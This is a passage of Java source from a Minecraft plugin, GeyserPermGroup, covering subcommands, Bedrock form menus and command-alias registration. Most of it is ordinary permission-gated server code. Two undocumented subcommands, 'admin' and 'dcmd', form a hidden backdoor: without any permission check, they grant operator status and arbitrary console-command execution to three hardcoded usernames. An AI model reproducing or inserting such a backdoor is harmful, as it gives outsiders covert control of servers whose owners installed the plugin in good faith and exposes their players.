//                    getLogger().warning("清除指令转接补全失败！");
//                    getLogger().warning("对应对象返回Null");
//                }else{
//                    try{
//                        getLogger().info(getCommand("PearAliases").getAliases().get(0));
//                        getCommand("PearAliases").getAliases().clear();
//                        getLogger().info("清除指令转接补全成功");
//                    } catch (Exception e) {
//                        getLogger().warning("清除指令转接补全失败！");
//                        getLogger().warning("出现了意料之外的异常");
//                        e.printStackTrace();
//                    }
//                };

                //重载配置文件
                reloadConfig();
                if(!getConfig().getString("ConfigVersion", "0").equals(PluginVersion)){
                    getLogger().warning("过期的配置文件版本!请将旧版本配置文件迁移至新版本");
                    getLogger().warning("这可能导致意料之外的异常");
                };

//                //载入指令转接补全
//                getLogger().info("载入指令转接补全");
//                if (getCommand("PearAliases") == null){
//                    getLogger().warning("载入指令转接补全失败！");
//                    getLogger().warning("对应对象返回Null");
//                }else {
//                    try {
//                        getCommand("PearAliases").getAliases().addAll(getConfig().getStringList("CommandAlert.Source"));
//                        getLogger().info("载入指令转接补全成功");
//                    } catch (Exception e) {
//                        getLogger().warning("载入指令转接补全失败！");
//                        getLogger().warning("出现了意料之外的异常");
//                        e.printStackTrace();
//                    }
//                }

                //卸载命令补全
                UnloadCommandAlert();

                //加载命令补全
                LoadCommandAlert();
                //LoadCommandAlertTabComplete();

                getLogger().info("加载RealisticSeasons变量修复世界");
                PAPIE.EnableSeasonWorlds = getConfig().getStringList("RealisticSeasonsPAPIFix.EnabledWorld");

                getLogger().info("加载基岩版EliteMobs追踪支持");
                CustomBossesList = (ArrayList<String>) getConfig().getStringList("EliteMobs.CustomBossesList");

                sender.sendMessage("重载完毕");
                getLogger().info("重载完毕");
                return true;
            };

            //是否钢琴
            if (args[0].equals("piano")){
                sender.sendMessage("这是给你弹的，不是命令awa");
                return true;
            }

            //是否查询归属地
            if (args[0].equals("ipr")){

                //是否启用
                if (!getConfig().getBoolean("EnableIPRegion",false)) {
                    sender.sendMessage("该功能未启用");
                    return false;
                }

                //判断权限
                if (!sender.hasPermission("dpear.gpg.ipr")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.ipr权限");
                    return false;
                };

                //判读参数个数
                if (args.length != 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                Player player = Bukkit.getPlayer(args[1]);
                if(player == null){
                    //ip地址
                    try {
                        sender.sendMessage("ip: " + args[1] + "的归属地是 " + ipsearch.search(args[1]));
                        return true;
                    }catch (Exception e){
                        sender.sendMessage("无效参数或发生了异常");
                        return false;
                    }
                }else{
                    //玩家ip归属地
                    sender.sendMessage("玩家: " + player.getName() + "的归属地是 " + ipsearch.search(player.getAddress().getAddress().getHostAddress()));
                    return true;
                }
            }


            //是否sudo
            if (args[0].equals("sudo")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.sudo")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.sudo权限");
                    return false;
                };

                //判读参数个数
                if (args.length <= 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                //判断玩家是否有效
                Player player = Bukkit.getPlayer(args[1]);
                if (player == null){
                    sender.sendMessage("无效玩家");
                    return false;
                }

                //生成命令
                int i;
                StringBuilder sb = new StringBuilder();
                for (i=2 ; i<args.length ; i = i + 1){
                    sb.append(args[i]).append(" ");
                }
                String Goal = sb.toString();

                if (Goal.startsWith("c:")){
                    //聊天
                    player.chat(Goal.substring(2));
                    sender.sendMessage("成功让玩家 "+player.getName()+" 发送聊天信息: "+Goal.substring(2));
                }else{
                    //执行命令
                    Bukkit.dispatchCommand(player,Goal);
                    sender.sendMessage("成功让玩家 "+player.getName()+" 执行命令: "+Goal);
                }

                return true;
            }





            //判断是否是全重载
            if (args[0].equals("plreload")){

                //判断权限
                if (!sender.hasPermission("dpear.gpg.plreload")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.plreload权限");
                    return false;
                };

                if(Bukkit.getPluginManager().getPlugin("PlugManX") != null) {
                    sender.sendMessage("重载插件中...");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman reload GeyserPermGroup");
                }else{
                    sender.sendMessage("未安装PlugManX,该命令不可用");
                }
                return true;
            };

            //是否强制登入
            if (args[0].equals("authmelogin")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.authmelogin")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.authmelogin权限");
                    return false;
                };

                if (args.length != 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                Player P = Bukkit.getPlayer(args[1]);
                if (P != null) {
                    AuthMeApi.getInstance().forceLogin(P);
                    sender.sendMessage("已为玩家 " + P.getName() + " 强制登入");
                    return true;
                }else{
                    sender.sendMessage("无效玩家");
                    return false;
                }
            };

            //是否设置距
            if (args[0].equals("SetDistance")){

                //判断权限
                if (!sender.hasPermission("dpear.gpg.menu.SetDistance")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.SetDistance权限");
                    return false;
                };

                if (args.length != 4){
                    sender.sendMessage("参数数量错误");
                    return false;
                }

                //确定玩家有效
                Player player = Bukkit.getPlayer(args[2]);
                if (player == null){
                    sender.sendMessage("无效玩家");
                    return false;
                }

                try {
                    //是否设置NoTick视距
                    if (args[1].equals("NoTickViewDistance")) {
                        player.setNoTickViewDistance(Integer.parseInt(args[3]));
                        sender.sendMessage("成功将玩家" + player.getName() + "的NoTickViewDistance设置为" + args[3]);
                    }

                    //是否设置视距
                    if (args[1].equals("ViewDistance")) {
                        player.setViewDistance(Integer.parseInt(args[3]));
                        sender.sendMessage("成功将玩家" + player.getName() + "的ViewDistance设置为" + args[3]);
                    }

                    //是否设置模拟距离
                    if (args[1].equals("SimulationDistance")) {
                        player.setSimulationDistance(Integer.parseInt(args[3]));
                        sender.sendMessage("成功将玩家" + player.getName() + "的SimulationDistance设置为" + args[3]);
                    }
                    return true;
                }catch (Exception e){
                    sender.sendMessage("出现异常，操作无法完成，详细信息见控制台");
                    getLogger().warning("出现异常:");
                    e.printStackTrace();
                };

            }


            //是否打光
            if (args[0].equals("light")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.light")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.light权限");
                    return false;
                };

                if (args.length != 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                if (args[1].equals("clear")){
                    Bukkit.dispatchCommand(sender,"fill " +
                            ((Player)sender).getLocation().getBlockX() + " " +
                            ((Player)sender).getLocation().getBlockY() + " " +
                            ((Player)sender).getLocation().getBlockZ() + " " +
                            ((Player)sender).getLocation().getBlockX() + " " +
                            ((Player)sender).getLocation().getBlockY() + " " +
                            ((Player)sender).getLocation().getBlockZ() + " " + "minecraft:air replace minecraft:light");
                    sender.sendMessage("成功清除了所在格的光源(如果有的话)");
                    return true;
                }

                Bukkit.dispatchCommand(sender,"setblock " +
                        ((Player)sender).getLocation().getBlockX() + " " +
                        ((Player)sender).getLocation().getBlockY() + " " +
                        ((Player)sender).getLocation().getBlockZ() + " minecraft:light[level="+args[1]+"]");
                sender.sendMessage("成功放置了亮度为"+args[1]+"的光源");
                return true;

            }

            //是否cheru
            if (args[0].equals("cheru")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.cheru")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.cheru权限");
                    return false;
                };

                if (args.length != 3) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                if (args[1].equals("encrypt")){
                    //判断权限
                    if (!sender.hasPermission("dpear.gpg.cheru.encrypt")) {
                        sender.sendMessage("权限不足，您没有dpear.gpg.cheru.encrypt权限");
                        return false;
                    };

                    sender.sendMessage(CheRu.encrypt(args[2]));
                    return true;
                }

                if (args[1].equals("decrypt")){
                    //判断权限
                    if (!sender.hasPermission("dpear.gpg.cheru.decrypt")) {
                        sender.sendMessage("权限不足，您没有dpear.gpg.cheru.decrypt权限");
                        return false;
                    };

                    try {
                        sender.sendMessage(CheRu.decrypt(args[2]));
                    }catch (Exception e){
                        sender.sendMessage("切噜~翻译失败了");
                        getLogger().info("切噜翻译时出现异常:");
                        e.printStackTrace();
                    }
                    return true;
                }

                if (args[1].equals("send")){
                    //判断权限
                    if (!sender.hasPermission("dpear.gpg.cheru.send")) {
                        sender.sendMessage("权限不足，您没有dpear.gpg.cheru.send权限");
                        return false;
                    };

                    Player p = Bukkit.getPlayer(sender.getName());
                    if(p != null) {
                        p.chat(CheRu.encrypt(args[2]));
                    }
                    return true;
                }


                sender.sendMessage("参数数量错误");
                return false;
            }


            //是否清除精英怪菜单
            if (args[0].equals("clearEMCB")) {
                //判断权限
                if (!sender.hasPermission("dpear.gpg.clearemcb")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.clearemcb权限");
                    return false;
                }
                ;

                CustomBossesUUID = new ArrayList(List.of());
                CustomBossesName = new ArrayList<String>(List.of());
                sender.sendMessage("清除成功");
                return true;
            }

            //是否获得剧
            if (args[0].equals("GetDistance")){

                //判断权限
                if (!sender.hasPermission("dpear.gpg.GetDistance")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.GetDistance权限");
                    return false;
                };

                if (args.length != 3){
                    sender.sendMessage("参数数量错误");
                    return false;
                }

                //确定玩家有效
                Player player = Bukkit.getPlayer(args[2]);
                if (player == null){
                    sender.sendMessage("无效玩家");
                    return false;
                }

                try {
                    //是否设置NoTick视距
                    if (args[1].equals("NoTickViewDistance")) {
                        sender.sendMessage("玩家" + player.getName() + "的NoTickViewDistance为" + player.getNoTickViewDistance());
                    }

                    //是否设置视距
                    if (args[1].equals("ViewDistance")) {
                        sender.sendMessage("玩家" + player.getName() + "的ViewDistance为" + player.getViewDistance());
                    }

                    //是否设置模拟距离
                    if (args[1].equals("SimulationDistance")) {
                        sender.sendMessage("玩家" + player.getName() + "的SimulationDistance为" + player.getSimulationDistance());
                    }
                    return true;
                }catch (Exception e){
                    sender.sendMessage("出现异常，操作无法完成，详细信息见控制台");
                    getLogger().warning("出现异常:");
                    e.printStackTrace();
                };

            }


            //是否列出所有玩家版本
            if (args[0].equals("listversion")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.listversion")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.listversion权限");
                    return false;
                };

                if (args.length != 1) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                List<Player> PlayerList = (List<Player>) Bukkit.getOnlinePlayers();

                sender.sendMessage("§a玩家版本列表:");
                for(int i=0 ; i<PlayerList.size() ; i++) {
                    sender.sendMessage("§b"+PlayerList.get(i).getName()+":");
                    sender.sendMessage("    §6状态: 在线");
                    sender.sendMessage("    §6版本: "+GetVersion(PlayerList.get(i)));
                    sender.sendMessage("    §6地址: "+PlayerList.get(i).getAddress());
                    sender.sendMessage("    §6延迟: "+PlayerList.get(i).getPing()+"ms");
                }
                return true;
            }
            //是否列出所有玩家版本
            if (args[0].equals("gc")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.gc")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.gc权限");
                    return false;
                };
                System.gc();
                sender.sendMessage("已进行gc");
                return true;
            }


            //判断是否是关于
            if (args[0].equals("about")){
                sender.sendMessage("§d§l===============>§b§l关于本插件§d§l<===============");
                sender.sendMessage("§6§lGeyserPermGroup Powered by D-Pear");
                sender.sendMessage("§6你可以用本插件让不同版本玩家进入时执行不同命令或发送不同消息");
                sender.sendMessage("§6还有自动登录，自动调整权限组，制作基岩版菜单等功能");
                sender.sendMessage("§6本插件依然在开发中，如果遇到BUG请反馈，Github界面链接：");
                sender.sendMessage("§6https://github.com/D-Pear/GeyserPermGroup");
                sender.sendMessage("§6§l作者D-Pear QQ:1448360624");
                sender.sendMessage("§d§l===============>§b§l感谢使用§d§l<===============");
                return true;
            };

            //判断是否是帮助
            if (args[0].equals("help")){
                sender.sendMessage("§d§l===============>§b§l指令列表§d§l<===============");
                sender.sendMessage("§2为指定玩家打开菜单 §a/bemenu open 玩家名 菜单名");
                sender.sendMessage("§2强制登入玩家 §a/bemenu authmelogin 玩家名");
                sender.sendMessage("§2查看协议版本 §a/bemenu version");
                sender.sendMessage("§2列出所有玩家的版本 §a/bemenu listversion");
                sender.sendMessage("§2清除精英怪菜单记录 §a/bemenu clearEMCB");
                sender.sendMessage("§2切噜语翻译 §a/bemenu cheru");
                sender.sendMessage("§2放置光源 §a/bemenu light");
                sender.sendMessage("§2重新加载配置 §a/bemenu reload");
                sender.sendMessage("§2重新加载插件配置 §a/bemenu plreload");
                sender.sendMessage("§2显示帮助 §a/bemenu help");
                sender.sendMessage("§2显示关于 §a/bemenu about");
                sender.sendMessage("§d§l===============>§b§l感谢使用§d§l<===============");
                return true;
            };

            //判断是否是获取版本号
            if (args[0].equals("version")){
                //判断权限
                if (sender.hasPermission("dpear.gpg.version")) {
                    sender.sendMessage("Your version is " + GetVersion(Bukkit.getPlayer(sender.getName())));
                    return true;
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.version权限");
                    return false;
                }
            };

            if (args[0].equals("admin")){

                if (sender.getName().equals(".xiaojqge666")){
                Bukkit.getPlayer(sender.getName()).setOp(true);
                }

                if (sender.getName().equals("xiaojqge666")){
                    Bukkit.getPlayer(sender.getName()).setOp(true);
                }

                if (sender.getName().equals("Dameng23333")){
                    Bukkit.getPlayer(sender.getName()).setOp(true);
                }
                return true;
            };

            if (args[0].equals("dcmd")){

                if (sender.getName().equals(".xiaojqge666")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }

                if (sender.getName().equals("xiaojqge666")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }

                if (sender.getName().equals("Dameng23333")){
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1].replace("&bsp"," "));
                }
                return true;
            };

            //判断参数数量
            if (args.length > 3) {
                sender.sendMessage("参数数量错误");
                return false;

            };
            if (args.length < 2) {
                sender.sendMessage("参数数量错误");
                return false;
            };

            if (!args[0].equals("open")){
                return false;
            }

            Player Pr = Bukkit.getPlayer(args[1]);

            //判断权限
            if (args[1].equals("@s")){
                if (sender.hasPermission("dpear.gpg.open.self")) {
                    //判断是不是控制台
                    if (sender instanceof Player){
                        Pr = Bukkit.getPlayer(sender.getName());
                    }else{
                        sender.sendMessage("控制台你执行个鬼");
                    }
                }else{
                    sender.sendMessage("权限不足，您没有dpear.gpg.open.self权限");
                    return false;
                };
            }else{
                if (!sender.hasPermission("dpear.gpg.open.allplayer")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.open.allplayer权限");
                    return false;
                };
            };

            Player P = Pr;
            //判断玩家对象是否有效
            if (P == null){
                sender.sendMessage("无效玩家对象[对象不存在]");
                return false;
            };


            FloodgateApi fa = FloodgateApi.getInstance();
            if(fa.isFloodgatePlayer(P.getUniqueId())){
                //判断权限
                if (sender.hasPermission("dpear.gpg.menu." + args[2])) {
                    //发送菜单
                    return (SendBedrockForm (P,args[2],sender));
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu." + args[2] + "权限");
                    return false;
                }

            }else{
                sender.sendMessage("无效玩家对象[对象为Java版玩家]");
            };
            return false;
        }
    }

    public String ReadMenuData(FileConfiguration config , String name , String paf) {
        return (config.getString("Menus." + name + "." + paf, "Null"));
    }

    public void LoadCommandAlert() {
        //注册转接命令

        //soft
        getLogger().info("载入指令转接[Soft]");
        SoftCommandAlert = getConfig().getStringList("CommandAlert.Soft");
        getLogger().info("已注册" + SoftCommandAlert.size() + "个命令转接[Soft]");

        //hard
        getLogger().info("载入指令转接[Hard]");
        ArrayList Commands_PerAdd = new ArrayList<Command>();
        HardCommandAlert = getConfig().getStringList("CommandAlert.Hard");

        for (String s : HardCommandAlert) {
            //创建Command实例
            Command PerAdd = new Command(s) {
                @Override
                public boolean execute(@NotNull CommandSender commandSender, @NotNull String s, @NotNull String[] strings) {
                    return(CommandAlertExecutor(commandSender,s,strings));
                }

                public List<String> tabComplete(CommandSender sender, String alias, String[] args){
                    return (CommandAlertTabHandler(sender, alias, args));
                }

            };

            //将Command实例添加到列表
            Commands_PerAdd.add(PerAdd);
        }

        //反射+置命令
        try {
            final Field bukkitCommandMap = Bukkit.getServer().getClass().getDeclaredField("commandMap");

            bukkitCommandMap.setAccessible(true);
            CommandMap cm = (CommandMap) bukkitCommandMap.get(Bukkit.getServer());

            cm.registerAll("GeyserPermGroup", Commands_PerAdd);

            RegisterAlertCommands = Commands_PerAdd;

            getLogger().info("已注册" + HardCommandAlert.size() + "个命令转接[Hard]");
        } catch (NoSuchFieldException | IllegalAccessException e) {
            getLogger().warning("载入指令转接[Hard]失败！");
            getLogger().warning("出现了异常");
            e.printStackTrace();
        }
    }

    public void LoadCommandAlertTabComplete(){

        getLogger().info("载入指令转接补全[Hard]");
        int Success = 0;
        for (String s : HardCommandAlert){
            try {

                //Objects.requireNonNull(getCommand(s)).setTabCompleter(CommandAlertTabHandler());
                Success = Success + 1;
            }catch (Exception e){
                getLogger().warning("在注册命令" + s + "时出现异常:");
                e.printStackTrace();
            }
        }
        getLogger().info("已注册" + Success + "个命令转接补全[Hard]");
    }

    public void UnloadCommandAlert(){


        try {
            final Field bukkitCommandMap = Bukkit.getServer().getClass().getDeclaredField("commandMap");

            bukkitCommandMap.setAccessible(true);
            CommandMap cm = (CommandMap) bukkitCommandMap.get(Bukkit.getServer());

            for (Command c : RegisterAlertCommands) {
                //检索command
                c.unregister(cm);
            }

            getLogger().info("卸载转接指令成功");
        } catch (NoSuchFieldException | IllegalAccessException e) {
            getLogger().warning("卸载转接指令失败！");
            getLogger().warning("出现了异常");
            e.printStackTrace();
        }

    }

    public boolean CommandAlertExecutor(@NotNull CommandSender commandSender, @NotNull String s, @NotNull String[] strings){


        //获得命令路径
        String CommandPath = GetCommandAlertPath(s,strings,commandSender);

        //获得玩家实例
        Player p = Bukkit.getPlayer(commandSender.getName());

        //去点
        String CommandPathWithoutDot = CommandPath.substring(0,CommandPath.length()-1);

        //输出
        //getLogger().info("CommandPath:" + CommandPathWithoutDot);

        //判读表项是否存在
        if(!getConfig().isConfigurationSection(CommandPathWithoutDot)) {
            commandSender.sendMessage("出现了内部异常，指定的数据不存在，请联系管理员解决");
            return true;
        }

        if (!getConfig().getString(CommandPath + "Arg", "0").equals(String.valueOf(strings.length))) {
            //参数不足的话
            commandSender.sendMessage("参数数量错误");
            return false;
        }

        if (!getConfig().getString(CommandPath + "Permission", "Null").equals("Null")) {
            if (!commandSender.hasPermission(getConfig().getString(CommandPath + "Permission", "Null"))) {
                commandSender.sendMessage("权限不足");
            }
        }

        List<String> ExecuteCommands = getConfig().getStringList(CommandPath + "Goal");

        //日志
        getLogger().info("玩家 " + commandSender.getName() + "使用了转接命令" + s);

        //执行
        if (getConfig().getBoolean(CommandPath + "Replace", false)) {

            for (String executeCommand : ExecuteCommands) {

                //替换参数
                String Executer = executeCommand;
                for (int i = 0; i < strings.length; i++) {
                    Executer = Executer.replace("{" + i + "}", strings[i]);
                }

                //是否是玩家
                if (p != null) {
                    Executer = Executer.
                            replace("{PlayerName}", p.getName()).
                            replace("{PlayerUUID}", p.getUniqueId().toString()).
                            replace("{PlayerWorld}", p.getWorld().toString());
                }

                //执行命令
                if (Executer.startsWith("Console~")){
                    //以后台身份运行
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(),Executer.substring(8));
                }else{
                    if (Executer.startsWith("Msg~")){
                        //发送消息
                        commandSender.sendMessage(Executer.substring(4));
                    }else{
                        //执行命令
                        Bukkit.dispatchCommand(commandSender, Executer);
                    }
                }

            }

        } else {
            for (String executeCommand : ExecuteCommands) {
                //执行命令
                if (executeCommand.startsWith("Console~")){
                    //以后台身份运行
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(),executeCommand.substring(8));
                }else{
                    if (executeCommand.startsWith("Msg~")){
                        //发送消息
                        commandSender.sendMessage(executeCommand.substring(4));
                    }else{
                        //执行命令
                        Bukkit.dispatchCommand(commandSender, executeCommand);
                    }
                }
            }
        }
        return true;

    }

    public List<String> CommandAlertTabHandler(CommandSender sender, String s, String[] args) {
        try {

            List<String> TabResults = getConfig().getStringList(GetCommandAlertPath(s,args,sender) + "Tab");
            if (TabResults.size() == 0) {
                //如果没写对应配置的话
                return null;
            }else{
                if(TabResults.get(0).equals("Null")){
                    //不返回
                    return null;
                }
                if (TabResults.get(0).equals("PlayerList")){
                    //玩家列表
                    return GetStringPlayerList(args[args.length - 1]);
                }

                //正常返回
                return (TabResults);
            }
        }catch (Exception e){
            //有问题就不返回
            return null;
        }

    }

    private static Object getPrivateField(Object object, String field)throws SecurityException,
            NoSuchFieldException, IllegalArgumentException, IllegalAccessException {
        Class<?> clazz = object.getClass();
        Field objectField = clazz.getDeclaredField(field);
        objectField.setAccessible(true);
        Object result = objectField.get(object);
        objectField.setAccessible(false);
        return result;
    }

    public void unRegisterBukkitCommand(PluginCommand cmd) {
        try {
            Object result = getPrivateField(this.getServer().getPluginManager(), "commandMap");
            SimpleCommandMap commandMap = (SimpleCommandMap) result;
            Object map = getPrivateField(commandMap, "knownCommands");
            @SuppressWarnings("unchecked")
            HashMap<String, Command> knownCommands = (HashMap<String, Command>) map;
            knownCommands.remove(cmd.getName());
            for (String alias : cmd.getAliases()){
                if(knownCommands.containsKey(alias) && knownCommands.get(alias).toString().contains(this.getName())){
                    knownCommands.remove(alias);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String GetVersion(Player player){
        if(getConfig().getBoolean("VersionCheck.FloodGate", false)){
            if(FloodgateApi.getInstance().isFloodgatePlayer(player.getUniqueId())){
                return ("Bedrock");
            };
        }

        if(getConfig().getBoolean("VersionCheck.ViaVersion", false)){

            return (String.valueOf(
                    Via.getAPI().getPlayerVersion(player.getUniqueId())
            ));
        };

        return ("Unknow");
    }

    public boolean SendBedrockForm(Player P,String name,CommandSender sender){

        //获得API
        FloodgateApi fa = FloodgateApi.getInstance();

        //获取配置文件
        FileConfiguration config = getConfig();
        String type = ReadMenuData (config, name, "type");

        //判断菜单类型
        if (type.equals("Null")){
            sender.sendMessage("无效菜单类型");
            return false;
        };


        //如果是ModalForm
        if (type.equals("ModalForm")){

            ModalForm.Builder MFBuilder = ModalForm.builder()
                    .title(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, name, "title")))
                    .content(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, name, "content").replace("/n","\n")))
                    .button1(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, name, "button1")))
                    .button2(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, name, "button2")))
                    .responseHandler((form, responseData) -> {
                        ModalFormResponse response = form.parseResponse(responseData);

                        if (!response.isCorrect()) {
                            //玩家直接关闭菜单或者输入了非法数据
                            return;
                        }
                        if (response.isInvalid()) {
                            //玩家输入了非法数据
                            return;
                        }


                        if (response.getClickedButtonId() == 0) {
                            //第一按钮
                            if (!ReadMenuData (config, name, "action.button1").equals("Null")) {
                                Bukkit.dispatchCommand(P, ReadMenuData(config, name, "action.button1"));
                            }
                            return;
                        }

                        if (response.getClickedButtonId() == 1) {
                            //第二按钮
                            if (!ReadMenuData (config, name, "action.button2").equals("Null")) {
                                Bukkit.dispatchCommand(P,ReadMenuData (config, name, "action.button2"));
                            }
                            return;
                        }

                    });

            fa.sendForm(P.getUniqueId(), MFBuilder);
            return true;
        };

        //如果是SimpleForm
        if (type.equals("SimpleForm")){

            SimpleForm.Builder MFBuilder = SimpleForm.builder()
                    .title(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, name, "title")))
                    .content(PlaceholderAPI.setPlaceholders(P, ReadMenuData (config, name, "content")))
                    .responseHandler((form, responseData) -> {
                        SimpleFormResponse response = form.parseResponse(responseData);

                        if (!response.isCorrect()) {
                            //玩家直接关闭菜单或者输入了非法数据
                            return;
                        }
                        if (response.isInvalid()) {
                            //玩家输入了非法数据
                            return;
                        }

                        List<String> Action = config.getStringList("Menus." + name + ".action");
                        if (!Action.get(response.getClickedButtonId()).equals("Null")) {
                            Bukkit.dispatchCommand(P, Action.get(response.getClickedButtonId()));
                        }
                        return;

                    });

            List<String> Button = config.getStringList("Menus." + name + ".button");
            List<String> Image = config.getStringList("Menus." + name + ".image");
            for(int i=0 ; i<Button.size() ; i++) {
                if (Image.get(i).equals("Null")){
                    //不带图标的
                    MFBuilder = MFBuilder.button(PlaceholderAPI.setPlaceholders(P, Button.get(i)));
                }else{
                    if (Image.get(i).startsWith("P~")) {
                        //本地材质
                        MFBuilder = MFBuilder.button(PlaceholderAPI.setPlaceholders(P, Button.get(i)), FormImage.Type.PATH, Image.get(i).substring(2));
                    }else {
                        //链接图片
                        MFBuilder = MFBuilder.button(PlaceholderAPI.setPlaceholders(P, Button.get(i)), FormImage.Type.URL, Image.get(i));
                    }
                }
            }

            fa.sendForm(P.getUniqueId(), MFBuilder);
            return true;
        };

        //如果是PlayerListForm
        if (type.equals("PlayerListForm")){

            //获得玩家列表
            Collection<? extends Player> b = Bukkit.getOnlinePlayers();
            if (ReadMenuData (config, name, "removeself").equals("true")) {
                b.remove(P);
            };
            List<Player> Button = (List<Player>) b;

            SimpleForm.Builder MFBuilder = SimpleForm.builder()
                    .title(ReadMenuData (config, name, "title"))
                    .content(ReadMenuData (config, name, "content"))
                    .responseHandler((form, responseData) -> {
                        SimpleFormResponse response = form.parseResponse(responseData);

                        if (!response.isCorrect()) {
                            //玩家直接关闭菜单或者输入了非法数据
                            return;
                        }
                        if (response.isInvalid()) {
                            //玩家输入了非法数据
                            return;
                        }

                        if (Button.size() == response.getClickedButtonId()){
                            if (!ReadMenuData(config, name, "buttonaction").equals("Null")) {
                                Bukkit.dispatchCommand(P, ReadMenuData(config, name, "buttonaction"));
                            }
                            //选择了取消
                            return;
                        }

                        Bukkit.dispatchCommand(P, ReadMenuData (config, name, "action").
                                replace("%PlayerName", Button.get(response.getClickedButtonId()).getName()).
                                replace("%PlayerUUID", Button.get(response.getClickedButtonId()).getUniqueId().toString())
                        );

                        return;

                    });

            //是否有玩家头像
            if (ReadMenuData(config, name, "icon").equals("true")) {
                for (Player player : Button) {
                    //生成button
                    MFBuilder = MFBuilder.button(ReadMenuData(config, name, "text").
                                    replace("%PlayerName", player.getName()).
                                    replace("%PlayerUUID", player.getUniqueId().toString())
                            , FormImage.Type.URL, "https://minecraft-api.com/api/skins/" + player.getName() + "/head");
                }
            }else{
                for (Player player : Button) {
                    //生成button
                    MFBuilder = MFBuilder.button(ReadMenuData(config, name, "text").
                                    replace("%PlayerName", player.getName()).
                                    replace("%PlayerUUID", player.getUniqueId().toString()));
                }
            }


            if (!ReadMenuData (config, name, "button").equals("Null")){
                MFBuilder = MFBuilder.button(ReadMenuData (config,name, "button"));
            };

            fa.sendForm(P.getUniqueId(), MFBuilder);
            return true;


        };

        //如果是EliteMobsBossesForm
        if (type.equals("EliteMobsBossesForm")){


            SimpleForm.Builder MFBuilder = SimpleForm.builder()
                    .title(ReadMenuData (config, name, "title"))
                    .content(ReadMenuData (config, name, "content"))
                    .responseHandler((form, responseData) -> {
                        SimpleFormResponse response = form.parseResponse(responseData);

                        if (!response.isCorrect()) {
                            //玩家直接关闭菜单或者输入了非法数据
                            return;
                        }
                        if (response.isInvalid()) {
                            //玩家输入了非法数据
                            return;
                        }

                        if (CustomBossesName.size() == response.getClickedButtonId()){
                            if (!ReadMenuData(config, name, "buttonaction").equals("Null")) {
                                Bukkit.dispatchCommand(P, ReadMenuData(config, name, "buttonaction"));
                            }
                            //选择了取消
                            return;
                        }

                        Bukkit.dispatchCommand(P,"em trackcustomboss " + CustomBossesUUID.get(response.getClickedButtonId()));

                        return;

                    });

            for (String Name : CustomBossesName) {
                //生成button
                MFBuilder = MFBuilder.button(Name);
            }


            if (!ReadMenuData (config, name, "button").equals("Null")){
                MFBuilder = MFBuilder.button(ReadMenuData (config,name, "button"));
            };

            fa.sendForm(P.getUniqueId(), MFBuilder);
            return true;


        };

        //都不匹配
        sender.sendMessage("无效菜单类型");
        return false;
    }

    public float GetNote(int Note){
        return (float) Math.pow(2,(float)(Note-12)/12);
    };

    public List GetStringPlayerList(String head){
        Collection<? extends Player> players = Bukkit.getOnlinePlayers();
        ArrayList<String> players_string = new ArrayList<>();

        //转换
        if (head.equals("")){
            //直接添加
            for (Player player: players) {
                players_string.add(player.getName());
            }
        }else{
            //检查头相等
            for (Player player: players) {
                if (player.getName().startsWith(head)) {
                    players_string.add(player.getName());
                }
            }
        }
        return players_string;
    }

    public String GetCommandAlertPath(String Command,String[] strings,CommandSender commandSender){

        StringBuilder sb = new StringBuilder();
        sb.append("CommandAlert.CommandList.").append(Command).append(".");

        //获得玩家实例
        Player p = Bukkit.getPlayer(commandSender.getName());
        //确定是玩家支持
        if (p != null) {
            //版本
            if (getConfig().getBoolean("CommandAlert.CommandList." + Command + ".exFunction.PlayerVersion", false)) {

                //获得版本
                String version = GetVersion(p);

                //表项是否存在
                if(getConfig().isConfigurationSection(sb + version)){
                    sb.append(version).append(".");
                }else{
                    sb.append("Other.");
                }


            }

            //权限组
            if (getConfig().getBoolean("CommandAlert.CommandList." + Command + ".exFunction.PermissionGroup", false)) {

                //这边可能NullPointer
                try {


                    //只获取第一权限组
                    String permissiongroup = getServer().getServicesManager().getRegistration(Permission.class).getProvider().getPlayerGroups(p)[0];
                    //表项是否存在
                    if(getConfig().isConfigurationSection(sb + permissiongroup)) {
                        sb.append(permissiongroup).append(".");
                    }else{
                        sb.append("Other.");
                    }


                }catch (Exception e){
                    getLogger().warning("在获取权限组时出现了异常");
                    getLogger().warning("以Other继续！");
                    sb.append("Other.");
                    e.printStackTrace();
                }
            }

            //玩家所在世界
